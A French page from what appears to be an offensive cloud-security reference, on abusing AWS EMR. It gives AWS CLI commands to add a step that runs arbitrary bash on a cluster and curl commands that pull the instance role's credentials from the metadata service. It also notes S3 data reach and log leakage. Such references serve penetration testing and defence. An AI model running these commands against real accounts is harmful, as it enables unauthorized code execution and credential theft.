---
title: "EMR : étapes de cluster et rôle d'instance"
order: 10
description: "Abuser des clusters EMR, des étapes et du rôle d'instance pour exécuter du code et lire des données à travers le cluster."
keywords:
  - EMR
  - cluster
  - étape
  - rôle d'instance
  - Hadoop
---

# EMR

EMR exécute des clusters Hadoop et Spark managés, chacun sur des instances EC2 qui portent un **rôle d'instance** (généralement `EMR_EC2_DefaultRole`) doté d'un large accès S3 aux données des traitements. Deux leviers comptent : ajouter une **étape** exécute du code arbitraire sur le cluster, et atteindre le nœud maître donne un shell en tant que rôle d'instance dont les identifiants proviennent d'IMDS.

## Trouver des clusters et ajouter une étape

```bash
aws emr list-clusters --active
aws emr describe-cluster --cluster-id <id> \
  --query 'Cluster.[Ec2InstanceAttributes.IamInstanceProfile,LogUri]'

# run code on the cluster as a step
aws emr add-steps --cluster-id <id> --steps \
  'Type=CUSTOM_JAR,Jar=command-runner.jar,Args=[bash,-c,"id;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'
```

## Prendre le rôle d'instance

```bash
# on the master node (SSH or step), read the role credentials from IMDS
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Notes d'exploitation

- Le rôle d'instance EMR dispose couramment d'un large accès S3 en lecture/écriture pour les entrées et sorties des traitements, de sorte que le prendre atteint les données du lac et souvent davantage.
- Les étapes s'exécutent en tant qu'utilisateur du cluster avec le rôle d'instance disponible via IMDS, ce qui constitue l'élévation même sans SSH.
- Les journaux du cluster dans le compartiment S3 configuré via `LogUri` peuvent eux-mêmes laisser fuir des données et des arguments.

## Outils

- **AWS CLI** (`emr list-clusters`, `add-steps`, `describe-cluster`).

## Références

- [AWS: EMR IAM roles](https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-iam-roles.html)
- [HackTricks Cloud: AWS EMR](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Pacu: AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
